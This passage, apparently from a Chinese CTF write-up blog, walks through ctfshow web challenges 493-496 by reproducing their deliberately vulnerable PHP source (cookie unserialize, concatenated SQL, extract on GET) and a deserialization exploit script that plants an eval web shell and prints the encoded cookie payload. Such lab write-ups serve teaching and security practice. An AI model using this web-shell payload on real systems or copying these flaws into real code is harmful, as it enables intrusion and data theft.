class="variable">$filename</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cache_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 12:11:38</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> =<span class="string">&#x27;&lt;?php @eval($_POST[zf]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span> =<span class="string">&quot;./zf.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;;user=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>));</span><br><span class="line"><span class="comment">#;user=O%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A26%3A%22%3C%3Fphp+%40eval%28%24_POST%5Bzf%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A8%3A%22.%2Fzf.php%22%3B%7D</span></span><br></pre></td></tr></table></figure>

<p>这个会写到根目录下面,是网页的根目录,原因是index.php文件调用的file_put_contents()所以以当前目录为基础进行写入</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411215049150.png" alt="image-20220411215049150"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411215056027.png" alt="image-20220411215056027"></p>
<h1 id="web494-495"><a href="#web494-495" class="headerlink" title="web494-495"></a>web494-495</h1><p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-13 19:59:12</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\:|\,/&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">			<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>();	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/or|and|innodb|sys/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line">		<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">		<span class="variable">$user</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_one_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;user&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;render_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-13 20:01:31</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">			<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">			cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;db_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-12 17:43:56</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;log=<span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;db=<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		 </span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable language_">$this</span>-&gt;addr,<span class="variable language_">$this</span>-&gt;username,<span class="variable language_">$this</span>-&gt;password,<span class="variable language_">$this</span>-&gt;database);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">		<span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">		<span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one_array</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">		<span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">		<span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;log-&gt;<span class="title function_ invoke__">log</span>(<span class="variable language_">$this</span>-&gt;sql);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;content = <span class="variable language_">$this</span>-&gt;content.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d-H-i-s&quot;</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$sql</span>.<span class="string">&#x27; \r\n&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>file_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 14:08:48</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cache_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-13 20:02:23</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为啥没变化,上一题脚本直接过.发现flag没有,可以直接通过蚁剑连接数据库,毕竟我们已经知道用户名和密码了</p>
<p>要填127.0.0.1哦</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411223652378.png" alt="image-20220411223652378"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411223730608.png" alt="image-20220411223730608"></p>
<h1 id="web496"><a href="#web496" class="headerlink" title="web496"></a>web496</h1><p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 05:42:14</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\:|\,/&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">			<span class="comment">#$user=unserialize($c);</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>();	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;check&#x27;</span>:</span><br><span class="line">		<span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/or|file|innodb|sys|mysql/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">			<span class="variable">$sql</span> = <span class="string">&quot;select username,nickname from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line">			<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">			<span class="variable">$user</span>=<span 